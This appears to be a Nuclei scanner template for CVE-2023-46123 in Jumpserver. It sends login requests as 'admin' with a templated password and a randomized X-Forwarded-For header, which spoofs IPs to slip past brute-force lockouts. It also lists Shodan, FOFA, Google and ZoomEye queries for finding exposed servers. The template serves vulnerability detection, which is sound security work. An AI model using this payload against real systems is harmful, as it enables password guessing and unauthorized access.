id: CVE-2023-46123

info:
  name: Jumpserver Password Brute-force Protection Bypass
  author: ProjectDiscoveryAI
  severity: medium
  description: Allows attackers to bypass password brute-force protections by spoofing arbitrary IP addresses in Jumpserver.
  impact: |
    Successful exploitation could lead to unauthorized access to the Jumpserver.
  remediation: |
    Implement proper password brute-force protection mechanisms such as account lockouts or rate limiting.
  reference:
    - https://github.com/jumpserver/jumpserver/security/advisories/GHSA-hvw4-766m-p89f
    - https://github.com/jumpserver/jumpserver/releases/tag/v3.8.0
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2023-46123
    cwe-id: CWE-307
    epss-score: 0.00075
    epss-percentile: 0.34153
    cpe: cpe:2.3:a:fit2cloud:jumpserver:*:*:*:*:*:*:*:*
  metadata:
    vendor: fit2cloud
    product: jumpserver
    shodan-query: http.title:'jumpserver'
    fofa-query: title="JumpServer"
    google-query: intitle:'jumpserver'
    zoomeye-query: title:'jumpserver'

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/v1/authentication/tokens/"

    headers:
      Content-Type: "application/json"
      X-Forwarded-For: "{{rand_ip}}"

    body: |
      {
        "username": "admin",
        "password": "{{password}}"
      }
    matchers:
      - type: status
        status:
          - 200
          - 401
